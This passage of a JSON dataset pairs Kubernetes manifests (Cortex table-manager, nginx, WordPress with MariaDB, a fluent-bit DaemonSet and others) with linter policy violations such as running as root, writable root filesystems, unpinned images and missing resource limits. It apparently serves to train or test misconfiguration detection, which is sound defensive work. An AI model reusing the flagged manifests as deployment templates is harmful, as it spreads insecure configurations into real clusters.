    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.2.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"table-manager\" has cpu request 0"
  },
  {
    "id": "9551",
    "manifest_path": "data/manifests/the_stack_sample/sample_3633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.2.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"table-manager\" has memory limit 0"
  },
  {
    "id": "9552",
    "manifest_path": "data/manifests/the_stack_sample/sample_3637.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3306\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9553",
    "manifest_path": "data/manifests/the_stack_sample/sample_3637.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3306\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9554",
    "manifest_path": "data/manifests/the_stack_sample/sample_3637.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3306\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9555",
    "manifest_path": "data/manifests/the_stack_sample/sample_3637.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3306\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9556",
    "manifest_path": "data/manifests/the_stack_sample/sample_3637.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3306\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9557",
    "manifest_path": "data/manifests/the_stack_sample/sample_3638.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend-reactjs-service\n  namespace: frontend\nspec:\n  selector:\n    app: frontend-reactjs\n  ports:\n  - port: 3002\n    targetPort: 3002\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:frontend-reactjs])"
  },
  {
    "id": "9558",
    "manifest_path": "data/manifests/the_stack_sample/sample_3640.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    prometheus.io/scrape: 'true'\n  labels:\n    app.kubernetes.io/component: metrics\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: kube-state-metrics\n    app.kubernetes.io/version: 2.3.0\n    helm.sh/chart: kube-state-metrics-4.4.1\n    release: RELEASE-NAME\n  name: RELEASE-NAME-kube-state-metrics\n  namespace: default\nspec:\n  ports:\n  - name: http\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/name: kube-state-metrics\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/instance:RELEASE-NAME app.kubernetes.io/name:kube-state-metrics])"
  },
  {
    "id": "9559",
    "manifest_path": "data/manifests/the_stack_sample/sample_3641.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: forecastservice\n  name: forecastservice\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: forecastservice\n  template:\n    metadata:\n      labels:\n        rand: b\n        app: forecastservice\n    spec:\n      containers:\n      - name: forecastservice\n        envFrom:\n        - secretRef:\n            name: forecast-service\n        image: gwdowner/forecastservice\n        imagePullPolicy: Always\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"forecastservice\" is using an invalid container image, \"gwdowner/forecastservice\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9560",
    "manifest_path": "data/manifests/the_stack_sample/sample_3641.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: forecastservice\n  name: forecastservice\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: forecastservice\n  template:\n    metadata:\n      labels:\n        rand: b\n        app: forecastservice\n    spec:\n      containers:\n      - name: forecastservice\n        envFrom:\n        - secretRef:\n            name: forecast-service\n        image: gwdowner/forecastservice\n        imagePullPolicy: Always\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"forecastservice\" does not have a read-only root file system"
  },
  {
    "id": "9561",
    "manifest_path": "data/manifests/the_stack_sample/sample_3641.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: forecastservice\n  name: forecastservice\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: forecastservice\n  template:\n    metadata:\n      labels:\n        rand: b\n        app: forecastservice\n    spec:\n      containers:\n      - name: forecastservice\n        envFrom:\n        - secretRef:\n            name: forecast-service\n        image: gwdowner/forecastservice\n        imagePullPolicy: Always\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"forecastservice\" is not set to runAsNonRoot"
  },
  {
    "id": "9562",
    "manifest_path": "data/manifests/the_stack_sample/sample_3641.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: forecastservice\n  name: forecastservice\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: forecastservice\n  template:\n    metadata:\n      labels:\n        rand: b\n        app: forecastservice\n    spec:\n      containers:\n      - name: forecastservice\n        envFrom:\n        - secretRef:\n            name: forecast-service\n        image: gwdowner/forecastservice\n        imagePullPolicy: Always\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"forecastservice\" has cpu request 0"
  },
  {
    "id": "9563",
    "manifest_path": "data/manifests/the_stack_sample/sample_3641.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: forecastservice\n  name: forecastservice\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: forecastservice\n  template:\n    metadata:\n      labels:\n        rand: b\n        app: forecastservice\n    spec:\n      containers:\n      - name: forecastservice\n        envFrom:\n        - secretRef:\n            name: forecast-service\n        image: gwdowner/forecastservice\n        imagePullPolicy: Always\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"forecastservice\" has memory limit 0"
  },
  {
    "id": "9564",
    "manifest_path": "data/manifests/the_stack_sample/sample_3642.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ktswebinar\n  labels:\n    app.kubernetes.io/name: ktswebinar\n    app.kubernetes.io/component: web\nspec:\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: http\n    protocol: TCP\n    name: http\n  selector:\n    app.kubernetes.io/name: ktswebinar\n    app.kubernetes.io/component: web\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:web app.kubernetes.io/name:ktswebinar])"
  },
  {
    "id": "9565",
    "manifest_path": "data/manifests/the_stack_sample/sample_3650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: f5-hello-world\n  labels:\n    run: f5-hello-world\nspec:\n  ports:\n  - port: 8080\n    protocol: TCP\n    targetPort: 8080\n  type: ClusterIP\n  selector:\n    run: f5-hello-world\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:f5-hello-world])"
  },
  {
    "id": "9566",
    "manifest_path": "data/manifests/the_stack_sample/sample_3651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: xom4ek/microservices-demo-paymentservice:v0.0.1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9567",
    "manifest_path": "data/manifests/the_stack_sample/sample_3651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: xom4ek/microservices-demo-paymentservice:v0.0.1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"paymentservice\" does not have a read-only root file system"
  },
  {
    "id": "9568",
    "manifest_path": "data/manifests/the_stack_sample/sample_3651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: xom4ek/microservices-demo-paymentservice:v0.0.1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"paymentservice\" is not set to runAsNonRoot"
  },
  {
    "id": "9569",
    "manifest_path": "data/manifests/the_stack_sample/sample_3651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: xom4ek/microservices-demo-paymentservice:v0.0.1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"paymentservice\" has cpu request 0"
  },
  {
    "id": "9570",
    "manifest_path": "data/manifests/the_stack_sample/sample_3651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: paymentservice\n        image: xom4ek/microservices-demo-paymentservice:v0.0.1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"paymentservice\" has memory limit 0"
  },
  {
    "id": "9571",
    "manifest_path": "data/manifests/the_stack_sample/sample_3652.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eth-bootnode-registrar\n  namespace: data\n  labels:\n    app: eth-bootnode-registrar\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eth-bootnode-registrar\n  template:\n    metadata:\n      labels:\n        app: eth-bootnode-registrar\n    spec:\n      containers:\n      - name: bootnode-registrar\n        image: jpoon/bootnode-registrar:v1.0.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BOOTNODE_SERVICE\n          value: eth-bootnode.data.svc.cluster.local\n        ports:\n        - containerPort: 9898\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"bootnode-registrar\" does not have a read-only root file system"
  },
  {
    "id": "9572",
    "manifest_path": "data/manifests/the_stack_sample/sample_3652.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eth-bootnode-registrar\n  namespace: data\n  labels:\n    app: eth-bootnode-registrar\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eth-bootnode-registrar\n  template:\n    metadata:\n      labels:\n        app: eth-bootnode-registrar\n    spec:\n      containers:\n      - name: bootnode-registrar\n        image: jpoon/bootnode-registrar:v1.0.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BOOTNODE_SERVICE\n          value: eth-bootnode.data.svc.cluster.local\n        ports:\n        - containerPort: 9898\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"bootnode-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "9573",
    "manifest_path": "data/manifests/the_stack_sample/sample_3652.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eth-bootnode-registrar\n  namespace: data\n  labels:\n    app: eth-bootnode-registrar\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eth-bootnode-registrar\n  template:\n    metadata:\n      labels:\n        app: eth-bootnode-registrar\n    spec:\n      containers:\n      - name: bootnode-registrar\n        image: jpoon/bootnode-registrar:v1.0.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BOOTNODE_SERVICE\n          value: eth-bootnode.data.svc.cluster.local\n        ports:\n        - containerPort: 9898\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"bootnode-registrar\" has cpu request 0"
  },
  {
    "id": "9574",
    "manifest_path": "data/manifests/the_stack_sample/sample_3652.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eth-bootnode-registrar\n  namespace: data\n  labels:\n    app: eth-bootnode-registrar\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eth-bootnode-registrar\n  template:\n    metadata:\n      labels:\n        app: eth-bootnode-registrar\n    spec:\n      containers:\n      - name: bootnode-registrar\n        image: jpoon/bootnode-registrar:v1.0.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BOOTNODE_SERVICE\n          value: eth-bootnode.data.svc.cluster.local\n        ports:\n        - containerPort: 9898\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"bootnode-registrar\" has memory limit 0"
  },
  {
    "id": "9575",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mariadb\" is using an invalid container image, \"mariadb:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9576",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mariadb\" does not have a read-only root file system"
  },
  {
    "id": "9577",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wordpress\" does not have a read-only root file system"
  },
  {
    "id": "9578",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mariadb\" is not set to runAsNonRoot"
  },
  {
    "id": "9579",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wordpress\" is not set to runAsNonRoot"
  },
  {
    "id": "9580",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mariadb\" has cpu request 0"
  },
  {
    "id": "9581",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wordpress\" has cpu request 0"
  },
  {
    "id": "9582",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mariadb\" has memory limit 0"
  },
  {
    "id": "9583",
    "manifest_path": "data/manifests/the_stack_sample/sample_3654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - name: wordpress\n        image: wordpress:5-php7.4-apache\n        ports:\n        - name: http-port\n          containerPort: 80\n        env:\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n        - name: WORDPRESS_DB_HOST\n          value: localhost\n      - name: mariadb\n        image: mariadb:latest\n        ports:\n        - name: mysql-port\n          containerPort: 3306\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: wordpress-secrets\n              key: db-password\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wordpress\" has memory limit 0"
  },
  {
    "id": "9584",
    "manifest_path": "data/manifests/the_stack_sample/sample_3655.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    component: selenium-grid-4\n    name: selenium-distributor\n  name: selenium-distributor\nspec:\n  ports:\n  - name: port1\n    port: 5553\n    protocol: TCP\n    targetPort: 5553\n  selector:\n    app: selenium-distributor\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:selenium-distributor])"
  },
  {
    "id": "9585",
    "manifest_path": "data/manifests/the_stack_sample/sample_3658.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fluent-bit\n  namespace: fluent-bit\n  labels:\n    app: fluent-bit\nspec:\n  selector:\n    matchLabels:\n      app: fluent-bit\n  template:\n    metadata:\n      labels:\n        app: fluent-bit\n    spec:\n      serviceAccountName: fluent-bit\n      serviceAccount: fluent-bit\n      containers:\n      - image: localhost:5000/klogs:latest-plugin\n        imagePullPolicy: Always\n        name: fluent-bit\n        ports:\n        - containerPort: 2020\n          name: http-metrics\n          protocol: TCP\n        env:\n        - name: LOG_LEVEL\n          value: info\n        volumeMounts:\n        - mountPath: /var/log\n          name: varlog\n        - mountPath: /var/lib/docker/containers\n          name: varlibdockercontainers\n          readOnly: true\n        - mountPath: /fluent-bit/etc/fluent-bit.conf\n          name: config\n          subPath: fluent-bit.conf\n        - mountPath: /fluent-bit/etc/parsers_custom.conf\n          name: config\n          subPath: parsers.conf\n        - mountPath: /tail-db\n          name: tail-db\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n      volumes:\n      - hostPath:\n          path: /var/log\n        name: varlog\n      - hostPath:\n          path: /var/lib/docker/containers\n        name: varlibdockercontainers\n      - hostPath:\n          path: /var/lib/fluent-bit\n          type: DirectoryOrCreate\n        name: tail-db\n      - configMap:\n          defaultMode: 420\n          name: fluent-bit\n        name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fluent-bit\" does not have a read-only root file system"
  },
  {
    "id": "9586",
    "manifest_path": "data/manifests/the_stack_sample/sample_3658.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fluent-bit\n  namespace: fluent-bit\n  labels:\n    app: fluent-bit\nspec:\n  selector:\n    matchLabels:\n      app: fluent-bit\n  template:\n    metadata:\n      labels:\n        app: fluent-bit\n    spec:\n      serviceAccountName: fluent-bit\n      serviceAccount: fluent-bit\n      containers:\n      - image: localhost:5000/klogs:latest-plugin\n        imagePullPolicy: Always\n        name: fluent-bit\n        ports:\n        - containerPort: 2020\n          name: http-metrics\n          protocol: TCP\n        env:\n        - name: LOG_LEVEL\n          value: info\n        volumeMounts:\n        - mountPath: /var/log\n          name: varlog\n        - mountPath: /var/lib/docker/containers\n          name: varlibdockercontainers\n          readOnly: true\n        - mountPath: /fluent-bit/etc/fluent-bit.conf\n          name: config\n          subPath: fluent-bit.conf\n        - mountPath: /fluent-bit/etc/parsers_custom.conf\n          name: config\n          subPath: parsers.conf\n        - mountPath: /tail-db\n          name: tail-db\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n      volumes:\n      - hostPath:\n          path: /var/log\n        name: varlog\n      - hostPath:\n          path: /var/lib/docker/containers\n        name: varlibdockercontainers\n      - hostPath:\n          path: /var/lib/fluent-bit\n          type: DirectoryOrCreate\n        name: tail-db\n      - configMap:\n          defaultMode: 420\n          name: fluent-bit\n        name: config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"fluent-bit\" not found"
  },
  {
    "id": "9587",
    "manifest_path": "data/manifests/the_stack_sample/sample_3658.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fluent-bit\n  namespace: fluent-bit\n  labels:\n    app: fluent-bit\nspec:\n  selector:\n    matchLabels:\n      app: fluent-bit\n  template:\n    metadata:\n      labels:\n        app: fluent-bit\n    spec:\n      serviceAccountName: fluent-bit\n      serviceAccount: fluent-bit\n      containers:\n      - image: localhost:5000/klogs:latest-plugin\n        imagePullPolicy: Always\n        name: fluent-bit\n        ports:\n        - containerPort: 2020\n          name: http-metrics\n          protocol: TCP\n        env:\n        - name: LOG_LEVEL\n          value: info\n        volumeMounts:\n        - mountPath: /var/log\n          name: varlog\n        - mountPath: /var/lib/docker/containers\n          name: varlibdockercontainers\n          readOnly: true\n        - mountPath: /fluent-bit/etc/fluent-bit.conf\n          name: config\n          subPath: fluent-bit.conf\n        - mountPath: /fluent-bit/etc/parsers_custom.conf\n          name: config\n          subPath: parsers.conf\n        - mountPath: /tail-db\n          name: tail-db\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n      volumes:\n      - hostPath:\n          path: /var/log\n        name: varlog\n      - hostPath:\n          path: /var/lib/docker/containers\n        